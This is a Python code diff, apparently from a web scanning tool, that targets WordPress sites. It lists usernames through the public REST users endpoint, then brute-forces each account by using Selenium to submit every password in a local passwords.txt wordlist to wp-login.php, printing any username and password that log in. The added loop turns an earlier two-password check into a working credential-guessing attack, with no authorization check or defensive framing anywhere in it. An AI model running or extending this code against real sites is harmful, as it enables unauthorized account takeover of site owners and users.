@@ -1,16 +1,19 @@
 from time import sleep
 from selenium.webdriver.common.by import By
-
+import os
 import Classes.Browser as Browser
 import requests
+from alive_progress import alive_it
 
 
+# Get the information for vulnerabilities or backdoors
 def get_information(browser, url, html, scripts, styles, page):
     if is_rest_normal(url):
         print('Wordpress default rest api 😈')
         get_users(browser, url)
 
 
+# Get users
 def get_users(browser, url):
     users = get_users_of_rest(url)
     if users:
@@ -26,22 +29,33 @@ def get_users(browser, url):
             try_logging_in(browser, url, user['slug'])
 
 
+# Try logging in to wordpress
 def try_logging_in(browser, url, username):
     browser.get(Browser.get_base_url(url) + "/wp-login.php")
     sleep(2)
     # find username/email field and send the username itself to the input field
     browser.find_element(By.ID, "user_login").send_keys(username)
     # find password input field and insert password as well
-    browser.find_element(By.ID, "user_pass").send_keys('test123')
-    # click login button
-    browser.find_element(By.ID, "wp-submit").click()
-    sleep(2)
-    # find password input field and insert password as well
-    browser.find_element(By.ID, "user_pass").send_keys('test1234567890')
-    # click login button
-    browser.find_element(By.ID, "wp-submit").click()
+
+    with open(os.path.abspath(os.getcwd()) + "/passwords.txt") as f_in:
+        lines = list(line for line in (l.strip() for l in f_in) if line)
+        print('Try passwords on users:')
+        print(username)
+        for line in alive_it(lines):
+            browser.find_element(By.ID, "user_pass").send_keys(line)
+            sleep(1)
+
+            browser.find_element(By.ID, "wp-submit").click()
+
+            sleep(2)
+            if not Browser.check_exists_by_id(browser, "wp-submit"):
+                print('Success!')
+                print('Username: ' + username)
+                print('Password: ' + line)
+                break
 
 
+# Get users of rest
 def get_users_of_rest(url):
     response = requests.get(Browser.get_base_url(url) + "/wp-json/wp/v2/users")
     if not response.status_code == 200:
@@ -49,6 +63,7 @@ def get_users_of_rest(url):
     return response.json()
 
 
+# Is the rest endpoint default
 def is_rest_normal(url):
     response = requests.get(Browser.get_base_url(url) + "/wp-json")
     if not response.status_code == 200:
@@ -58,6 +73,7 @@ def is_rest_normal(url):
         return True
 
 
+# Are given assets from a wordpress
 def is_wordpress(scripts, styles):
     is_a_wordpress = False
     if styles or scripts:
@@ -73,6 +89,7 @@ def is_wordpress(scripts, styles):
     return is_a_wordpress
 
 
+# Is given asset a wordpress url
 def is_wordpress_asset(url):
     if "/wp-content/" in url or "/wp-includes/" in url:
         return True
